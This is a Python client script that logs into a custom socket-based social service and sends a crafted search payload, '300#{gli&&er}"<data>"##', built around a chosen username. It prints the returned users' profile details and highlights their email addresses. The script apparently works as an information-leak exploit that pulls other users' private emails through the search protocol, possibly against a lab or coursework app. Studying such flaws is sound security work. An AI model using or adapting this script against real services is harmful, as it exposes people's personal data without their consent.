import getopt
import sys
from mySock import client, close
from myUtil import login, separator, RESET, GREEN, RED
import json


search_payload = '300#{gli&&er}"<data>"##'

USER_NAME = ""
PASSWORD = ""
SEARCH_DATA = ""

USAGE_INFO = """
Usage: feed.py -u <user_name> -p <password> 
    -d <username to search>
"""


def get_params(opts):
    global USER_NAME, PASSWORD, SEARCH_DATA
    global search_payload

    # collect data
    for opt, arg in opts:
        if opt == '-h':
            print(USAGE_INFO)
            sys.exit()
        elif opt == '-u':
            USER_NAME = arg
        elif opt == '-p':
            PASSWORD = arg
        elif opt == '-d':
            SEARCH_DATA = arg


def format_payloads():
    global search_payload
    search_payload = search_payload.replace("<data>", SEARCH_DATA)


def action(sock):
    print(search_payload)
    sock.send(search_payload.encode())
    data = sock.recv(2048)
    print_data(data.decode())


def print_data(data):
    data = separator(data)

    for user in data:
        print(f"""
        {GREEN}
        Name: {user['screen_name']}
        Description: {user['description']}
        Privacy: {user['privacy']}
        Id: {user['id']}
        {RESET}
        {RED}Mail: {user['mail']}{RESET}
        """)
        print("\n")


def main(argv):
    # try to get main arguments
    try:
        opts, args = getopt.getopt(argv, "hu:p:d:")
    except getopt.GetoptError:
        print(USAGE_INFO)
        sys.exit()

    get_params(opts)

    # create socket and login
    print("[+] Started")
    sock = client()
    USER_ID = login(sock, USER_NAME, PASSWORD)

    # create payloads
    format_payloads()

    # main action
    action(sock)

    # close connection
    close(sock)


if __name__ == '__main__':
    main(sys.argv[1:])
